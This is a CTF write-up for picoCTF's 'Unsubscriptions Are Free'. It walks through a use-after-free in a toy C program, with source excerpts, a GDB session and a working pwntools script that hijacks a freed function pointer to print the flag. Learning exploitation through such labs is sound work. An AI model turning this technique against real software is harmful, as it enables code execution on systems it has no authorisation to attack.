# Unsubscriptions Are Free
## Description
Check out my new video-game and spaghetti-eating streaming channel on Twixer! [program](vuln) and get a flag. [source](vuln.c) `nc mercury.picoctf.net 48259`
## Hints
1. [http://homes.sice.indiana.edu/yh33/Teaching/I433-2016/lec13-HeapAttacks.pdf](http://homes.sice.indiana.edu/yh33/Teaching/I433-2016/lec13-HeapAttacks.pdf)
## Solution
Connect to the server and check out what's running.
```console
% nc mercury.picoctf.net 48259
Welcome to my stream! ^W^
==========================
(S)ubscribe to my channel
(I)nquire about account deletion
(M)ake an Twixer account
(P)ay for premium membership
(l)eave a message(with or without logging in)
(e)xit
e
```
Ok, let's look at the source. There are a couple points of interest right up front: function `hahaexploitgobrrr` reveals the flag and function `s` leaks its address.
```c
void hahaexploitgobrrr(){
 	char buf[FLAG_BUFFER];
 	FILE *f = fopen("flag.txt","r");
 	fgets(buf,FLAG_BUFFER,f);
 	fprintf(stdout,"%s\n",buf);
 	fflush(stdout);
}

void s(){
 	printf("OOP! Memory leak...%p\n",hahaexploitgobrrr);
 	puts("Thanks for subsribing! I really recommend becoming a premium member!");
}
```
```console
% nc mercury.picoctf.net 48259
Welcome to my stream! ^W^
==========================
(S)ubscribe to my channel
(I)nquire about account deletion
(M)ake an Twixer account
(P)ay for premium membership
(l)eave a message(with or without logging in)
(e)xit
s
OOP! Memory leak...0x80487d6
Thanks for subsribing! I really recommend becoming a premium member!
```
Ok, so we know where to get the flag (`0x80487d6`), but how do we get there? Function `i` frees the memory pointed to by `cmd *user`, but the program doesn't exit at that point and it continues to use the pointer.
```c
void i(){
	char response;
  	puts("You're leaving already(Y/N)?");
	scanf(" %c", &response);
	if(toupper(response)=='Y'){
		puts("Bye!");
		free(user);
	}else{
		puts("Ok. Get premium membership please!");
	}
}

int main(){
	setbuf(stdout, NULL);
	user = (cmd *)malloc(sizeof(user));
	while(1){
		printMenu();
		processInput();
		//if(user){
			doProcess(user);
		//}
	}
	return 0;
}
```
It's a use-after-free scenario! We can exploit it through the layout of the `cmd` structure and the `doProcess` function.
```c
typedef struct {
	uintptr_t (*whatToDo)();
	char *username;
} cmd;

void doProcess(cmd* obj) {
	(*obj->whatToDo)();
}
```
If we write the address of `hahaexploitgobrr` to the `whatToDo` member, we'll be able to execute it. But how? First, delete the account with option `i`, then submit `0x80487d6` as a message with option `l`, calling the `leaveMessage` function.
```c
void leaveMessage(){
	puts("I only read premium member messages but you can ");
	puts("try anyways:");
	char* msg = (char*)malloc(8);
	read(0, msg, 8);
}
```
Why does this work? Because when a new chunk of memory is allocated with `leaveMessage`, it'll point to the same chunk of memory pointed to by `user`, so long as we execute the correct order of operations outlined previously. We can confirm this in GDB.
```console
% gdb -q vuln
(gdb) b *(main+93)
Breakpoint 1 at 0x8048d92
(gdb) b *(leaveMessage+64)
Breakpoint 2 at 0x8048a61
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/ryan/ctf/vuln 
Welcome to my stream! ^W^
==========================
(S)ubscribe to my channel
(I)nquire about account deletion
(M)ake an Twixer account
(P)ay for premium membership
(l)eave a message(with or without logging in)
(e)xit
i

Breakpoint 1, 0x08048d92 in main ()
(gdb) info addr user
Symbol "user" is at 0x804b060 in a file compiled without debugging.
(gdb) x/x 0x804b060
0x804b060 <user>:       0x0804c1a0
(gdb) x/x *0x804b060
0x804c1a0:      0x08048a7f
(gdb) info addr i
Symbol "i" is at 0x8048a7f in a file compiled without debugging.
```
We put a breakpoint in `main` at the call to `doProcess` and another in `leaveMessage` after the call to `malloc`. We chose option `i` and we see that `user` points to `0x804c1a0`. The address of `i` is stored at that address. Let's continue.
```console
(gdb) c
Continuing.
You're leaving already(Y/N)?
y
Bye!
Welcome to my stream! ^W^
==========================
(S)ubscribe to my channel
(I)nquire about account deletion
(M)ake an Twixer account
(P)ay for premium membership
(l)eave a message(with or without logging in)
(e)xit
l
I only read premium member messages but you can 
try anyways:

Breakpoint 2, 0x08048a61 in leaveMessage ()
(gdb) p/x $eax
$1 = 0x804c1a0
(gdb) x/x 0x804b060
0x804b060 <user>:       0x0804c1a0
```
We hit the breakpoint in `leaveMessage` and the address returned from `malloc` matches the address pointed to by `user`.
```console
(gdb) c
Continuing.
hello

Breakpoint 1, 0x08048d92 in main ()
(gdb) x/x 0x804c1a0
0x804c1a0:      0x6c6c6568
(gdb) x/s 0x804c1a0
0x804c1a0:      "hello\n"
(gdb) x/s *0x804b060
0x804c1a0:      "hello\n"
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x6c6c6568 in ?? ()
```
That's our confirmation. Let's put it in action.
```python
from pwn import *

server = remote("mercury.picoctf.net", 48259)

# delete the account
server.recvuntil(b'(e)xit\n')
server.sendline(b'i')
server.recvline()
server.sendline(b'y')

# inject the address for hahaexploitgobrrr
server.recvuntil(b'(e)xit\n')
server.sendline(b'l')
server.recvuntil(b'try anyways:\n')
payload = p32(0x080487d6)
server.sendline(payload)

print("Flag: " + server.recvline().decode())
```
```console
% python exploit.py
[+] Opening connection to mercury.picoctf.net on port 48259: Done
Flag: picoCTF{d0ubl3_j30p4rdy_cff1f12d}

[*] Closed connection to mercury.picoctf.net port 48259
```
